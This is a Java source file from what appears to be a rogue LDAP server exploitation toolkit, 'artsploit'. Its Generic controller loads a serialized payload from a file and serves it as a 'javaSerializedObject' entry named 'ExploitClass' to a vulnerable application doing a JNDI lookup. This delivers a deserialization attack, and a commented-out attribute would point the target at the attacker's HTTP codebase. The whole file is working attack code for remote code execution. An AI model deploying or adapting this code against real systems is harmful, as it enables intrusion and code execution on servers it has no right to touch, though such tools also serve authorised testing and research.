package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.nio.file.Files;
import java.nio.file.Path;

/**
 * Yields:
 * Reads the bytes of a specified file (via --generic-payload-path) and sends them as "Serializable Object" to the target application.
 *
 * @see <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html">Java object storage inside LDAP directory documentation</a>
 * Requires:
 *  The vulnerable class(es) in the classpath of the target
 *
 * @author GEBIRGE
 */
@LdapMapping(uri = { "/o=generic" })
public class Generic implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        if (Config.genericPayloadPath.isEmpty()) throw new Exception("--generic-payload-path must be set");

        byte[] payload = Files.readAllBytes(Path.of(Config.genericPayloadPath));

        System.out.println("Sending LDAP Serializable Object (inline payload)");

        Entry e = new Entry(base);
        e.addAttribute("objectClass", "javaSerializedObject");
        e.addAttribute("javaSerializedData", payload);
        e.addAttribute("javaClassName", "ExploitClass");

        // The following attribute is *always* used when "com.sun.jndi.ldap.object.trustURLCodebase" is set to "true"
        // in the target application, meaning the lookup will reach out to the specified URL even if the class information
        // is already available in the target application (because of a vulnerable dependency).
        // See https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html (Serializable Objects).
        // e.addAttribute("javaCodeBase", "http://" + Config.hostname + ":" + Config.httpPort + "/");

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
